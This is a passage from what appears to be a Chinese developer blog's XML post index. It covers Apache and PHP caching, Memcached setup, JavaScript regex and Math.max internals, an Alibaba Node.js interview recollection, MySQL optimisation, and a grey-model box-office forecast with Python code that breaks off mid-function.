week&quot; ExpiresByType application/javascript &quot;access plus 2 weeks&quot; ExpiresByType image/x-icon &quot;access plus 6 months&quot; ExpiresByType image/gif &quot;access plus 6 months&quot; ExpiresByType image/png &quot;access plus 6 months&quot; ExpiresByType image/jpeg &quot;access plus 6 months&quot; ExpiresByType video/x-flv &quot;access plus 6 months&quot; ExpiresByType application/pdf &quot;access plus 6 months&quot;&lt;/IfModule&gt; 启用 keep-alive、gzip 和 cache-cotrol 后，头信息如下 1234567891011Accept-Ranges:bytesCache-Control:max-age=604800Content-Encoding:gzipContent-Length:12582Content-Type:text/cssDate:Wed, 30 Aug 2017 11:51:04 GMTETag:&quot;2006d7-f7b2-557cf4809c580&quot;Expires:Wed, 06 Sep 2017 11:51:04 GMTLast-Modified:Mon, 28 Aug 2017 12:17:42 GMTServer:Apache/2.2.15 (CentOS)Vary:Accept-Encoding 静态页面缓存对于很少变化的 PHP 页面，可以将 PHP 解析结果缓存起来，动态页面静态化，以减少数据库操作，加快响应速度。 如下案例， 12345678910111213141516$file = &quot;./cache/index.html&quot;;$ctime = filectime($file);$expr = 3600*2; //过期时间 2 小时if(file_exists($file) &amp;&amp; $ctime+$expr&gt; time()) &#123; echo file_get_contents($file);&#125;else&#123; ob_start(); unlink($file); //删除过期的静态页文件 // 数据库操作 $content = ob_get_contents(); file_put_contents($file,$content); // 写入内容到对应静态文件中 ob_end_flush();&#125; 减少数据库操作使用 Memcached 缓存 安装 12yum install libevent libevent-deveyum install memcached 运行 123456789101112memcached -p 11211 -m 256m -vv# 后台启动memcached -p 11211 -m 256m -d-d是启动一个守护进程；-m是分配给Memcache使用的内存数量，单位是MB；-u是运行Memcache的用户；-l是监听的服务器IP地址，可以有多个地址；-p是设置Memcache监听的端口，，最好是1024以上的端口；-c是最大运行的并发连接数，默认是1024；-P是设置保存Memcache的pid文件。 在 PHP 中使用MySQL 数据优化PHP 操作数据库时，将数据缓存也是减少减小数据库压力增加响应速度的策略之一，使用 Redis 或 Memecached 可以实现。关于数据库的优化参考之前文章。 参考 http://www.admin10000.com/document/4927.html http://51write.github.io/2014/04/09/keepalive/ http://blog.wpjam.com/m/gzip/ https://teddysun.com/326.html http://weizhifeng.net/high-performance-with-apache.html https://www.renfei.org/blog/http-caching.html https://zh.wikipedia.org/wiki/HTTP/2 http://www.imooc.com/article/1478]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>缓存</tag>
        <tag>优化</tag>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript 正则表达式学习笔记]]></title>
    <url>%2Ffundamental%2Fprogramming-language%2Fphp%2Fphp-learn-regular-expression%2F</url>
    <content type="text"><![CDATA[正则表达式，又称正规表示式、正规表示法、正规表达式、规则表达式、常规表示法（英语：Regular Expression，在代码中常简写为regex、regexp或RE），是计算机科学的一个概念。正则表达式使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串。在很多文本编辑器里，正则表达式通常被用来检索、替换那些匹配某个模式的文本。 以我的理解，正则即是一种查找规则，用与快速查找元素的规则。 基本规则 \b 元字符，代表单词开头或结尾，通常而言单词有空格、标点、tab 、换行等分割。不匹配字符只匹配位置 . 元字符，匹配除换行以外的任意字符。 元字符，代表数量，任意多次（可以 0 次）。前边的内容可以连续重复使用任意次以使整个表达式得到匹配。 元字符，任意多次（最少 1 次） \d 元字符，匹配一个数字：\d\d\d\d\d\d\d\d\d\d\d ===&gt; \d{11} 必须连续匹配 11 次 \s 元字符，匹配任意空白符：空格、制表符、换行符、中文全角空格等 \w 元字符，匹配字母、数字、下划线、汉字等 ^ 匹配字符串的开始 $ 匹配字符串的结尾，如 /^\d{11}$/g 要求整个字符串匹配都要求规则，而不是在字符串中匹配符合规则的子串 字符转义查找元字符本身需要字符转义，如查找 .: 重复 重复 0 次或者多次 重复 1 次或者多次 ? 重复 0 次或者 1 次 {n} 重复 n 次 {n,} 至少重复 n 次 [未完待续]…… 参考资料 https://deerchao.net/tutorials/regex/regex.htm https://github.com/jawil/blog/issues/20]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Programing-language</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>正则</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript 查找数组最大值]]></title>
    <url>%2Ffundamental%2Falgorithm%2Falgorithm-find-max-number-in-array%2F</url>
    <content type="text"><![CDATA[JavaScript 中，提供 Math.max() 函数，使用方式如下： console.log( Math.max(3,5,8) ); // 8 其中参数以 list 形式给出，调用方式如： Math.max([value1[, value2[, ...]]]) 详细使用方式参考 MDN 那么 Math.max 的内部实现机制是怎样的呢？ Math.max 内部实现流程首先我们来看一下 Math 对象。与其它全局对象不同的是，Math 不是一个构造器，而是是一个单例对象，按照 ES7 官方文档，Math 对象挂载在全局对象（window 或 global）的 Math 属性上，所以 Math.max() 实际上等价于 window.Math.max() （Node 环境 global.Math.max()）。 查阅 ES 5 不难发现，调用 Math.max() 时基本流程如下： 1each param of list ==&gt; toNumber ---&gt; ToPrimitive ----&gt; Object.defaultValue --&gt; NaN 参数列表中每个参数调用 toNumber 转为数值型， toNumber 函数中如果是 String 类型有一套转化规则，如果是 Object 先调用 ToPrimitive 方法将对象转为基本类型（non-Object）得到 primValue ，再返回 toNumber(primValue)。 primValue 则调用对象内部 defualtValue 方法得到，该方法最终规定了对象的 defualtValue 规则。 以上基本为 Math.max 的基本流程，Math.max 的容错规则如下： 没有参数返回负无穷 只要任意参数为 NaN 则返回 NaN 再看 max 算法了解 max 的工作机制以后我们看 v8 源码 1234567891011121314151617181920212223242526272829// ECMA 262 - 15.8.2.11function MathMax(arg1, arg2) &#123; // length == 2 var length = %_ArgumentsLength(); // 获取参数长度 if (length == 2) &#123; arg1 = TO_NUMBER(arg1); // 转为数值型 arg2 = TO_NUMBER(arg2); if (arg2 &gt; arg1) return arg2; if (arg1 &gt; arg2) return arg1; if (arg1 == arg2) &#123; // Make sure -0 is considered less than +0. // +0 &gt; -0 return (arg1 === 0 &amp;&amp; %_IsMinusZero(arg1)) ? arg2 : arg1; &#125; // All comparisons failed, one of the arguments must be NaN. return NaN; &#125; var r = -INFINITY; // 遍历集合 for (var i = 0; i &lt; length; i++) &#123; var n = %_Arguments(i); n = TO_NUMBER(n); // Make sure +0 is considered greater than -0. // 出现 NaN 或者参数个数为 0 等情况 if (NUMBER_IS_NAN(n) || n &gt; r || (r === 0 &amp;&amp; n === 0 &amp;&amp; %_IsMinusZero(r))) &#123; r = n; &#125; &#125; return r;&#125; 查找算法很简单，就是遍历集合，算法复杂度为 O(n)，源码中做了很多容错处理， 再看 apply在 JavaScript 中，每个函数都是一个 Function 对象。Function 对象下有 apply、call 和 bind 等属性，很多文章都谈过 apply、call 和 bind 的作用和区别，apply、call 和 bind 都可以动态改变 this 指向。其中 apply 要求传递两个参数，第一个是 this 指向，第二个是数组，数组中的各元素最终被转成 list 集合，因此我们可以使用 apply 求数组元素最大值。如下：1Math.max.apply(obj, arr); 执行过程： 判断 Math.max() 是否允许被调用 判断 arr 是否为 null 或者 undefined，如果是以 obj 为 this 指向直接调用 Math.max() 判断 arr 是否为对象（数组也是对象），如果不是抛异常 遍历 arr 将其中元素以 list 集合形式作为参数传递给 Math.max() 使用 obj 身份调用 Math.max()，obj 对象获得 max() 函数的功能： obj.max(arr[0],…,arr[i]) 总结动态改变函数调用者是 JavaScript 很灵活的地方，工作中应充分利用这一特点以提高工作效率。]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>algorithm</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[阿里前端（Node.js方向）一面总结]]></title>
    <url>%2Fepisode%2Falibaba-node-interview%2F</url>
    <content type="text"><![CDATA[8 月 17 日上午 10 点一刻，我和同事正在讨论： “这个问题就是这样，下载接口这样就可以了，没必要太麻…” 这一刻，荣耀手机响了 “回首依然望见故乡月亮 黑夜给了我黑色眼睛 我却用它去寻找光明……” 一看，杭州，我和同事说，你等我一会，咱一会继续讨论… “喂，您好” “你好，请问是…” … “好的，那下午 3:00 等您电话” 回来继续讨论问题… 中午和同事吃完饭，突然晴天霹雳，倾盆大雨突如其来，猝不及防，马路上的积水已经淹没了滚动的车轮，我没带伞，但风雨无阻，我急急忙忙的跑回了学校，拖鞋溅起的水花洒湿了我的臀部…终于，大雨在我跨进寝室楼的那一刻戛然而止，看到老乡群里还在成语接龙，正好到了“为所欲为”，果不其然，下一句是“为你麻痹，逼上梁上，山穷水尽，尽力而为，为所欲为”。 我洗完澡，换上另一条花裤衩，已经两点又一刻，看看手机电量 78%，嗯，够了。左手拿着手机，右手握住雨伞，右脚一拉门，“嘣”一声响，门关好了。 打印了一份简历，来到平时办公的工作室门前，里面亮着灯，是的有人。轻轻敲了敲门，正在屋内复习高等代数的考研小妹妹从屋内传来优雅的呼声：“谁呀”，“是我，贵宾”。我告诉她，一会我有个面试，过来这边安静一些。聊了一会，我说我准备面试去了。 有点渴，放下手中的雨伞，看看上次 A 同学带过来的那盒龙井，还有最后两包，一包已经拆开了。拿起热水壶到隔壁热水房打了一壶热水，嗯？尿意浓浓？进入厕所，抬着头探了一口气，身体不自主哆嗦了一下。洗了一把脸，拿着热水来到咖啡厅，咖啡厅已经放假关门了。将手中的热水壶放下，背后是一个书架，书架背后还有一躺沙发，我起身去拿茶壶和杯子还有铁观音。 沏好茶，静坐，窗外雨滴声已经停了，看了看时间， 2：45。 不出意外，再过一刻钟，我的手机将再次响起，仍然会是那个杭州的电话，当然唱的还是那首歌“回首依然望见故乡月亮…”。就在这时候，远处传来了脚步声，“哒，哒，哒…”，清脆、均匀、细腻，是高跟鞋与光滑地面的碰撞，不对，还有手机里传出的民谣。我仿佛看到了她窈窕的身材，仿佛看到了她扭动的屁股。声音在靠近，我激动的起了身，对的，她再向我走来。5米、4米、3米，我看着她，她也看着我，这一刻持续的时间如 HTTP 请求花费的时间，精确到了毫秒。正当我张开嘴“你…”，还没等完全吐出口，她从我身边走过，在书架后面的沙发中似坐似躺，如葛优，玩起了手机。我控制住了自己，往咖啡厅的沙发背她而坐，她关掉了音乐，我不知道她为什么来这里。 茶已经沏开，往 10 毫升茶杯中到满了一杯，“噗~”吹了一口，细细品尝，清香雅韵，如天然般的兰花，滋味纯浓，香气馥郁而持久… 5分钟过去了，现在是 2：51，远处再次响起了脚步声，粗糙、逆耳。是一位男孩，男孩子向她走去，我起身踱步于咖啡桌的空隙之间，在等待。男孩子在女孩旁边坐下，听到“波~”，回头一看，书架后面，男孩亲了一下女孩子。我装作没看到，回到沙发，再次背她而坐。看了一下手机，2:58。 打开网易云音乐，找到收藏着的民谣专辑，嗯，确实很多都已经变灰。点了一首老狼的《我要你》，我有点紧张，再喝一口茶，心中默默念了一遍自我介绍。3:05分，手机终于想起，还是那个杭州的电话，还是那首歌“回首依然望见故乡月亮，黑夜给了我黑色眼睛…” “喂，您好” “你好，请问是…” “是的” “那我们开始面试…” 然后就是正儿八经的面试了 自我介绍 balabala… 你说你在腾讯大连实习，说一下腾讯大连是一个什么情况? 腾讯大连是一个腾讯全资子公司，做的是深圳那边的项目，balabala… 说一下你实习在项目中做了什么? 背景...， 角色...， 任务....， 收获.... balabala一大堆... 实习中提到回掉地狱，说一下你的解决方案 我说开始使用 async 库，后来服务器升级了 Node 版本，使用了 async await 的形式 提到 async await 说一下内部机制（蒙蔽），细问 await 干什么的？ （回答不好，面试官好像不是很满意）我说 async await 更多像是语法糖，就是把 Generator 生成器包装了一下。 await 等的是异步执行完成，然后将结果返回，成功的话往下走，失败的话 catch 捕获 Promise 内部实现机制（蒙蔽中） Promise 是 resonve reject 形式，成功走 resove 失败走 reject ，可能理解不是很透彻目前还处于使用阶段，没仔细研究过底层细节（跳过，往后面引） 项目中提到了 Token ，问了为什么选择 Token， 与 Seesion 区别? （答不好）Redis 中只存了 Session，使用 Token 可以解决多终端同时在线，Token 不用考虑集群中的同步问题， Token 计算比 IO 请求要快（可能不是这样） Session 怎么识别用户？ 前端传 Cookie，Cookie 中保存了 Session id… 那你是怎么做 Token 延时的？ （答不好） Token 的过期时间延时还没解决，但我有两个方案，一是每次客户端请求重新生成 Token，然后返回（显然不是最好的）；二是服务端缓存 Toke，每次更新 Token 缓存过期时间，面试官继续问… 其实我最好的答案没说出来，可能有点紧张。最好的想法是将 token 的过期时间缓存，只有当 Token 快要过期的时候才更新 Token。 那你用 Token 和 Session 还是有什么区别？（都是套路啊，哈哈~） … 问了为什么用 MongoDB ？MongoDB 和 MySQL 的存储方式有什么区别？ （存储方式？蒙蔽中，这么大的话题怎么说清楚？随便说说…）存储方式倒是没有仔细研究过，倒是知道他们之间的一些区别，MongoDB 存的是 bson，MySQL 直接存数据…（没说清楚），MongoDB 不支持事务… 实习中提到了跨域，说一下跨域的解决方案 跨域常用方式两种，JSONP 和 CROS，说了一下 JSONP 的原理，按照 jQuery 源码中思路说（往 jQuery 中引），再说了一下 CROS 的坑，按照之前的博客 问怎么处理 options 预检请求 Node 端直接返回 200 状态码… 提到看过 jQuery 源码，问$(selector) 后返回什么？是数组还是对象？（被动蒙蔽） （开始毛不犹豫的说是对象，因为有点忘记了，模糊了）是一个可遍历对象，类似数组的对象，每个 dom 元素是一个对象，加了一个 length 属性 …（面试官问那如果是对象多个元素怎么可以按照数组取，蒙蔽了赶紧说）好像是数组，在返回之前调用了一个 makeArray 的方法转为数组了（面试官接着问，那是数组怎么还可以继续调用后面的方法）…又解释一通 最终又回来看源码： 靠 id 匹配返回对象，考类这样能匹配多个元素的调用 makeArray 返回数组… 提到 jQuery 中的继承，问 JS 中的继承，细问原型冒充，提到 call 和 apply ES6 之前，拷贝继承，原型继承，原型冒充也可以继承特定属性，实现多继承，ES6 引入了 extends 关键字。 细问原型冒充怎么实现，balabala… 接触 Node 才这么一个半月？你怎么能胜任 Node 方向？ 是的，但是我之前一直接触过 JS，JS 基础还是可以的（往 JS 基础引，希望问更多基础内容…，失败，没问），另外 Node 需要操作数据库，我数据库方面还不错（往数据库引…失败，没问） 说一下你在学校的那个项目？ 您指的是哪个项目？神经网络那个还是… 不，就业网那个 balabala… 前端用什么？ 后端用什么？ 前端用的 JS 多一些，使用 jQuery（再次引导，失败） ，大日历使用了 calendar .js 库，后端数据动态添加… 后端也算是做了一些数据库的优化（再次引导，失败） 你还有什么要补充？ 我靠，这么快结束了，蒙蔽中... 数据库不问了？ 网络不问了？ 操作系统不问了？ 算法不问了？ 安全不问了？ 感觉希望不大了，死皮赖脸的说： “数据库方面咱不问吗?（数据库是长项，希望能加分）” “数据库今天咱不问了” sad…… “那今天咱先这样，后续有什么问题我们 HR会联系你…” “额，，，那个，，，有个问题” “哦，对了，你还有什么问题要问我吗？” 你还有什么问题要问？ 从今天面试情况来看，如果我要从事 Node 方向接下来应该在那方面更加加强学习一下？ “你项目经理不错，但是（瞬间泪奔…估计没戏了）你要做 Node 开发 Node 方面还需要加强，最起码 async await 原理你应该懂， Promise 实现细节这些今天面试都没有体现出来…” “哦，知道了，那我回头加强这方面的学习，感谢面试官” “嗯，那没什么问题今天就到这” 嘟，挂了…历时 36 分钟 9 秒 … 感觉已挂。“尽人事，听天命”，完。]]></content>
      <categories>
        <category>Episode</category>
      </categories>
      <tags>
        <tag>Interview</tag>
        <tag>Node</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[定时发送天气预报]]></title>
    <url>%2Fexperience%2Fpractice%2Fdev-send-weather-forecast-timely%2F</url>
    <content type="text"><![CDATA[手机端的天气预报应用有很多，但总是差强人意，一方面不想下载天气预报应用，另一方面各种应用参差不齐，往往对天气的预报有偏差，又或者是根本不想抽时间去关注今天的天气情况…编不下去了，不管怎样，程序员总是要折腾，于是抽了点时间写了个定时发送天气预报的应用程序。实现思路很简单，就是调一些 API，大概流程如下： 配置地址、电话信息 百度经纬度 API 天气接口 发送短信接口 部署到线上环境定时执行 地址信息本来是想通过手机动态定位，但经过多种尝试都没能成功，尝试过的方案如下： 通过MAC 地址获取失败 通过 IMEI 获取失败 通过 IP 无法得到 IP 失败 所以只能先手动配置有待以后慢慢探索，但希望配置能更精确，而不是一个广泛的概念，比如配置为“辽宁省大连市甘井子区大连海事大学”。天气预报接口跨域根据输入的城市或地区定位，但位置信息太精确可能获取不到，比如输入天气接口能获取到“大连”的天气信息，但不一定能获取到“甘井子区”的天气信息。好在有些天气预报支持经纬度查询，因此将详细地址转化为经纬度后通过经纬度可以获取到最小范围的天气信息，因此我们使用百度地图的 API。 百度地图 webservice-geocoding API天气接口 最终选择心知天气，选择经纬度定位确保获取成功 生活指数 短信接口- 使用阿里大于：申请复杂，模板固定 - 使用 139 或 189 邮箱，开通结尾太丑 继续尝试其他方案 - 短信宝，终于找到一个注册后就可以使用的 [未完待续…]]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>API</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL 基础优化]]></title>
    <url>%2Ffundamental%2Fstorage%2Fmysql-optimize%2F</url>
    <content type="text"><![CDATA[谈 MySQL 优化不如说是 MySQL 的基础学习，本文从以下几个方面探讨 MySQL 的使用技巧。 建表优化 索引优化 SQL 优化 集群优化 MySQL 的优化思路：不查-&gt;少查-&gt;内存查-&gt;磁盘查-&gt;用索引-&gt;少排序 建表优化 定长与变长分离 常用字段和不常用字段分离 列类型选择：int &gt; date，time &gt; enum，char &gt; varchar &gt; blob，text int 定长，没有字符集差异 time 定长，运算快，节省空间。但需要考虑时区，写 SQL 时不方便 where &gt; ‘2005-10-12’; enum 能起来约束值的目的，内部用整型来存储，但与 char 联查时，内部要经历串与值的转化 char 定长，需要考虑字符集和(排序)校对集 varchar， 不定长 要考虑字符集的转换与排序时的校对集，速度慢. text/blob 无法使用内存临时表(排序等操作只能在磁盘上进行) 比如性别存储选 tinyint: char(1) ， 3个字长字节 enum(‘男’，’女’); // 内部转成数字来存，多了一个转换过程 tinyint() ， // 0 1 2 // 定长1个字节. 再如时间字段存储可以选择 INT 或 TIMESTAMP 或 DATETIME 类型，DATETIME 类型需要考虑时区差异造成的影响，而 INT 和 DATETIME 需要转化。具体选择要结合需求。 尽量避免用NULL() 原因: NULL不利于索引和查询，查询时 WHERE clo_name IS NULL或者WHERE clo_name IS NOT NULL要用特殊的字节来标注。在磁盘上占据的空间其实更大(mysql5.7已对null做的改进，但查询仍是不便)。 加冗余地段 (触发器) 在两表关联时，比如文章表article和评论表comment之间有关联，查询文章时想要查询文章下的评论总数，如果没有冗余字段需要联合查询，效率很低，因此可以在文章表中添加com_count冗余字段，该字段保存该文章下的评论总数。再添加和删除评论时用可以使用触发器对该字段进行修改。 还有一中场景是有一个字段叫name保存的是中文姓名，查询时经常会对该字段按照拼音排序，如果选用 GBK 字符集默认就是拼音排序，但如果其他字符集可以加一个冗余的拼音字段，以达到快速排序的效果。 字符集选择 如果确认全部是中文，不会使用多语言以及中文无法表示的字符，那么GBK是首选。采用UTF-8编码会占用3个字节，而GBK只需要2个字节。 引擎选择 MySQL 中常用的引擎有 MyISAM 和 InnoDB，其中 InnoDB 支持事务，MyISAM 不支持事务，选择引擎时除了考虑事务支持以外还要考索引类型的不同，MyISAM 默认为非聚簇索引，InnoDB 为非聚簇索引。 索引优化基本概念 主键 主键，又称主码（英语：primary key 或 unique key）。数据库表中对储存数据对象予以唯一和完整标识的数据列或属性的组合。一个数据列只能有一个主键，且主键的取值不能缺失，即不能为空值（Null）。 从技术的角度来看，primary key和unique key有很多相似之处。但还是有以下区别： 作为 primary key 的列不能为Null。而 unique key 可以。 在一个表中只能有一个 primary key，而可以有多个 unique key。 更大的区别在逻辑设计上。primary key 一般在逻辑设计中用作记录标识，这也是设置 primary key 的本来用意。而 unique key 只是为了保证字段取值的唯一性。 索引 索引是数据库管理系统中一个排序的数据结构，以协助快速查询、更新数据库表中数据，MyISAM 和 InnoDB 引擎中的索引是 B-tree，Memory 引擎中的索引是 Hash。 外键 外键（英语：foreign key，），又称外部键。其实在关系数据库中，每个数据表都是由关系来连系彼此的关系，父数据表（Parent Entity）的主键（primary key）会放在另一个数据表，当做属性以创建彼此的关系，而这个属性就是外键。 比如1：1的关系，使用主表的id作为从表的主键。 索引类型 Btree 索引和 Hash 索引 Btree 适用于范围查找，相等比较，模糊查找 (=， &gt;， &gt;=， &lt;， &lt;=， or BETWEEN operators)，查找速度O(lgn) Hash 适用于相等比较(equality comparisons: =，&lt;=&gt;)，查找速度 O(1)，只能在 Memory 引擎中使用。 【误区】 在where条件常用的列上都加上索引 例：查询第3个栏目下 art_id 大于 where cat_id = 3 and art_id &gt; 100 ; 误: cat_id 上，和， art_id 上都加上索引. 错: 只能用 上cat_id 或 art_id 索引，因为索引是相互独立的，同时只能用上 1 个。 联合索引 如果 where 条件是根据多列进行筛选的，那么应该在多个列上建立一个索引，这就是联合索引。使用联合索引要注意建立时列的顺序，只有前一列上的索引被使用后一列索引才能被使用。如在 c1，c2，c3，c4 上建立联合索引 create table t4 ( c1 tinyint(1) not null default 0， c2 tinyint(1) not null default 0， c3 tinyint(1) not null default 0， c4 tinyint(1) not null default 0， c5 tinyint(1) not null default 0， index c1234(c1，c2，c3，c4) ); 以下情况分别使用到的索引 A where c1=x and c2=x and c4&gt;x and c3=x B where c1=x and c2=x and c4=x order by c3 C where c1=x and c4= x group by c3，c2 D where c1=x and c5=x order by c2，c3 A 中使用到了4个长度的键 B 中查找使用 c1，c2，排序使用 c3 C 中只有查找使用到 c1 D 中查找使用 c1，分组使用 c2，c3 聚簇索引和非聚簇索引 聚簇索引（也叫聚集索引）是一种索引，该索引中键值的逻辑顺序决定了表中相应行的物理顺序。简单理解就是主键和数据存储在一起，其他普通索引是对主键的引用，InnoDB 就属于聚簇索引。 非聚簇索引是主键和其他普通索引都单独存储，索引是对数据行的引用。 优势: 根据主键查询条目比较少时，不用回行(数据就在主键节点下) 劣势: 如果碰到不规则数据插入时，造成频繁的页分裂。 因此对于 InnoDB 而言，因为节点下有数据文件，因此节点的分裂将会比较慢。对于innodb的主键，尽量用整型，而且是递增的整型。如果是无规律的数据，将会产生的页的分裂，影响速度。 索引使用技巧 索引覆盖 索引覆盖是指如果查询的列恰好是索引的一部分，那么查询只需要在索引文件上进行，不需要回行到磁盘再找数据。这种查询速度非常快，称为”索引覆盖”。 索引的长度 理想的索引应该是查询频繁、区分度高、长度小、尽量能覆盖常用查询字段，比如在性别中建立索引是没有太大意义的，具体案例:https://www.v2ex.com/t/296130 如果针对 char 类型字段建立索引，当字段长度太大时应根据查询需要截取部分长度建立索引（如果左模糊查询较多应从左开始建立索引），截取长度可以根据区分度来选择： mysql&gt; select count(distinct left(word，2))/count(*) from tableName; 冗余索引 冗余索引是指2个索引所覆盖的列有重叠， 称为冗余索引 比如文章与标签表 +------+-------+------+ | id | artid | tag | +------+-------+------+ | 1 | 1 | PHP | | 2 | 1 | nux | | 3 | 2 | SQl | | 4 | 2 | Orac | +------+-------+------+ 在实际使用中，有 2 种查询 artid--- 查询文章的 ---tag tag--- 查询文章的 ---artid select tag from t11 where artid=2; select artid from t11 where tag=&apos;PHP&apos;; 这种查询方式在博客中是很常用的，如果利用建立联合索引往往可以使用索引覆盖达到高效查询。 避免隐式转换 隐式转换是指 SQL 查询条件中的传入值与对应字段的数据定义不一致导致索引无法使用。常见隐士转换如字段的表结构定义为字符类型，但 SQL 传入值为数字；或者是字段定义 collation 为区分大小写，在多表关联的场景下，其表的关联字段大小写敏感定义各不相同。隐式转换会导致索引无法使用，进而出现上述慢 SQL 堆积数据库连接数跑满的情况。 由于 MySQL 不支持函数索引，在开发时要避免在查询条件加入函数，例如 date(gmt_create)。 SQL 优化 使用 profiling 查看执行时间 使用 explain 查看执行计划 LIMIT 优化 limit offset，N 这是一个常见的问题https://www.v2ex.com/t/296130，当offset非常大时， 效率极低， 原因是 MySQL 并不是跳过 offset 行，然后单取 N 行，而是取 offset+N 行，返回放弃前 offset 行，返回N行。当offset越大时，效率越低，为了避免这种情况可以 从业务上去解决，不允许翻过100页，以百度为例，一般只允许翻页到 70 页左右。 不用 offset， 用条件查询，如 where id &gt; offset limit N，这样做的缺陷是如果 id 缺失（某条记录被删除）将导致查询结果又偏差，但大数据量下的翻页牺牲一些准确度换取性能是可以的，如果非要准确度可以对数据进行逻辑删除而不是物理删除。 如果非要用 offset 可以使用延迟关联。 # 先用索引查出 id select id from tableName limit 5000000，10 # 在连接查询，完整 SQL 如下 select * from tableName inner join (select id from tableName limit 5000000，10) as tmp using(id); COUNT 优化 MyISAM 中对 count 进行了优化，count 统计时直接从表中读取值。 InnoDB 中的 count 使用索引统计 注意索引会被缓存到内存中，所以再次执行时比第一次快很多： 尽量避免 where 条件的 count 特别是条件列中没有索引的时候查询会更加慢。 MySQL 集群优化策略读写分离优化策略典型问题: 有一业务场景，经过测试，读写比为1:20，请根据读写比，合理设置优化方案.根据写数据/读数据的比例，(Insert/update/delelte) / (select) 主从复制实现步骤大概如下，具体请查阅官方文档： 首先确保主服务器打开二进制日志功能。这样，主服务器一旦有数据变化,立即产生二进制日志。 从服务器也需要开启二进制日志和 relay 日志功能。这样可以从主服务器读取 binlog, 并产生 relaylog。 在主服务器建立一个从服务器的账号，并授予读 binlog 的权限。 指定从服务对应的主服务器，开启从服务器。 主主复制从服务器一是起到备份作用，二是起到分担查询压力的作用，如果一台服务器不足以承当写的压力可以配置多台服务器共同承担写任务，他们之间的数据可以相互复制，他们的关系是平等的。 参考链接 燕十八《MySQL 优化》 https://dev.mysql.com/doc/refman/5.5/en/index-btree-hash.html#btree-index-characteristics http://www.cnblogs.com/aspnethot/articles/1504082.html http://mysql.taobao.org/monthly/2017/02/05/ http://blog.csdn.net/whzhaochao/article/details/49126037 https://www.teakki.com/p/57e22e65a16367940da64470]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Storage</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[战狼 2 票房是否会达到 40 亿？]]></title>
    <url>%2Fexperience%2Fpractice%2Fdev-wolf-warriors-II-box-office-forecast%2F</url>
    <content type="text"><![CDATA[电影票房影响因素有很多，如影片质量、宣传、档期、排片、同期竞争、口碑等。灰色模型（GM） 常常用于对小规模数据进行预测分析。本文试图使用 GM(1,1) 对战狼 2 票房进行预测。 GM(1,1)灰色系统内的一部分信息是已知的，另一部分信息是未知的，系统内各因素间有不确定的关系。 灰色预测是对既含有已知信息又含有不确定信息的系统进行预则，就是对在一定范围内变化的、与时间有关的灰色过程进行预测。灰色预测通过鉴别系统因素之间发展趋势的相异程度，即进行关联分析，并对 原始数据进行生成处理来寻找系统变动的规律，生成有较强规律性的数据序列，然后建立相应的微分方程模型，从而预测事物未来发展趋势的状况。 『注』更多详细介绍可以参考我的另一篇博文基于灰色模型（GM(1,1)）的船舶事故预测研究 非周末特征初步观察历史数据可以发现，周末票房明显增长，这也是合理的，因此周末和非周末分开预测。基于7月27~8月4日除去周末的历史票房， 使用 GM(1,1) 对未来 5 天工作日（8.07-8.11）预测，预测结果为： [ 26592.85722754 26863.52726345 27136.95225974 27413.16025724，27692.17958215] 周末特征基于周票房末数据即7月29,7月30,8月5号使用GM(1,1)对周日（8 .06） 票房预测，预测结果为：29942.36973182 万。 因此未来 6 天以后总票房预测达到 429990 万元。 为社么可以相信预测结果其实在真正预测之前需要对模型的精度和准确性做估计，以非周末特征做为例，为了验证模型的准确性，我们选择7月27~8月3日中的非周末数据对8月4号票房做预测，预测结果为，26308.26947235，实际结果为 26340.9 相对误差 0.1%，娱乐而已，足矣！ 写在最后 影响电影的票房因素有很多，本文使用 GM（1,1）预测，模型对内部的复杂关系进行了关联，最终做出了预测。当然如果未来的影响因素发生巨变，比如电影排期突然下降、甚至停播，那么预测结果将会受到巨大影响，因此预测纯属娱乐，仅供参考，不准轻喷。 最后放一张我在战狼中的照片[左一]，其实只有几秒的镜头，我和班长站在舰长前面保卫着舰长，当冷锋干儿子跑过来的时候我说：“站住”，仅此而已！ 源码预测源码使用方式，新建文件 gm.py，将一下代码复制到 gm.py 中，在文件目录下执行 &gt;# python gm.py 即可看到输出结果 # -*- coding: utf-8 -*- import numpy as np import math def predict_func(history_data, m): n = len(history_data) X0 = np.array(history_data) #累加生成 history_data_agg = [sum(history_data[0:i+1]) for i in range(n)] X1 = np.array(history_data_agg) #计算数据矩阵B和数据向量Y B = np.zeros([n-1,2]) Y = np.zeros([n-1,1]) for i in range(0,n-1): B[i][0] = -0.5*(X1[i] + X1[i+1]) B[i][1] = 1 Y[i][0] = X0[i+1] #计算GM(1,1)微分方程的参数a和u #A = np.zeros([2,1]) A = np.linalg.inv(B.T.dot(B)).dot(B.T).dot(Y) a = A[0][0] u = A[1][0] #建立灰色预测模型 XX0 = np.zeros(n) XX0[0] = X0[0] for i in range(1,n): XX0[i] = (X0[0] - u/a)*(1-math.exp(a))*math.exp(-a*(i)); #模型精度的后验差检验 e = 0 #求残差平均值 for i in range(0,n): e += (X0[i] - XX0[i]) e /= n #求历史数据平均值 aver = 0; for i in range(0,n): aver += X0[i] aver /= n #求历史数据方差 s12 = 0; for i in range(0,n): s12 += (X0[i]-aver)**2; s12 /= n #求残差方差 s22 = 0; for i in range(0,n): s22 += ((X0[i] - XX0[i]) - e)**2; s22 /= n #求后验差比值 C = s22 / s12 #求小误差概率 cout = 0.0 for i in range(0,n): if abs((X0[i] - XX0[i]) - e) &lt; 0.6754*math.sqrt(s12): cout = cout+1 else: cout = cout P = (cout / n) sum_pre = 0 if (C &lt; 0.35 and P &gt; 0.95): #预测精度为一级 f = np.zeros(m) for i in range(0,m): f[i] = 